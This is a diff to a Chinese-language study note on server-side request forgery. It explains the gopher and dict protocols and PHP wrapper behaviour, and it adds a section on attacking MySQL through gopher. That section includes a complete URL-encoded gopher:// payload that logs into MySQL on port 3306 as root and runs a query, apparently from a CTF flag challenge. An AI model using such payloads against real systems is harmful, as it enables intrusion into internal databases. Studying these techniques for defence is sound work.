@@ -51,10 +51,12 @@ exp.php
 
 gopher协议是一种信息查找系统，他将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。现在它基本过时，人们很少再使用它。虽然很古老但现在很多库还支持gopher 协议而且gopher 协议功能很强大。
 
-它可以实现多个数据包整合发送，然后gopher 服务器将多个数据包捆绑着发送到客户端，这就是它的菜单响应。比如使用一条gopher 协议的curl 命令就能操作mysql 数据库或完成对redis 的攻击等等。
+<font color='red'>**它可以实现多个数据包整合发送，然后gopher 服务器将多个数据包捆绑着发送到客户端，这就是它的菜单响应。比如使用一条gopher 协议的curl 命令就能操作mysql 数据库或完成对redis 的攻击等等。**</font>
 gopher 协议使用tcp 可靠连接。
 
 它只支持文本，不支持图像
+
+![](6.png)
 
 **https://yinwc.github.io/2018/07/31/Gopher/**
 
@@ -99,7 +101,7 @@ http://ip/ssrf.php?url=dict://ip:22
 ![](3.jpg)
 
 
-大部分 PHP 并不会开启 fopen 的 gopher wrapper
+**大部分 PHP 并不会开启 fopen 的 gopher wrapper**
 
 file_get_contents 的 gopher 协议不能 URLencode
 
@@ -112,7 +114,28 @@ curl_exec() //默认不跟踪跳转，
 file_get_contents() // file_get_contents支持php://input协议
 
 
+### gopher 攻击mysql
 
+查看php 支持的扩展：
+
+	php -m
+
+[php如何查看扩展是否开启](https://blog.csdn.net/weixin_34055787/article/details/93571824)
+
+
+https://github.com/undefinedd/extract0r-
+
+![](4.jpg)
+![](5.jpg)
+
+	gopher://foo@[cafebabe.cf]@yolo.com:3306/A%40%00%00%00O%B7%00%00%00%00%00%
+	01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%0
+	0%14A%81%96%94%08%BFFE%5C%1C%2A%A322%0F%94%02S%87%7Fmysql%00K%01%00%00%03select%
+	20concat%28cast%280x504b03040a00000000000000000000000000e8030000e803000010000000
+	746869735f69735f7468655f666c6167%20as%20binary%29%2C%20rpad%28%28select%20now%28
+	%29%29%2C%201000%2C%20%27-%27%29%2C%20cast%280x504b01021e030a0000000000000000000
+	0000000100000000000000000000000000000000000746869735f69735f7468655f666c6167504b0
+	506000000000100010036000000640000000000%20as%20binary%29%29%00%00%00%00
 
 ## ssrf 解决方案
 
@@ -144,3 +167,5 @@ file_get_contents() // file_get_contents支持php://input协议
 ## 参考资料
 
 [php，java， python中的ssrf ](https://www.t00ls.net/articles-41070.html)
+
+[Gopher](https://www.kancloud.cn/a173512/php_note/1690690)
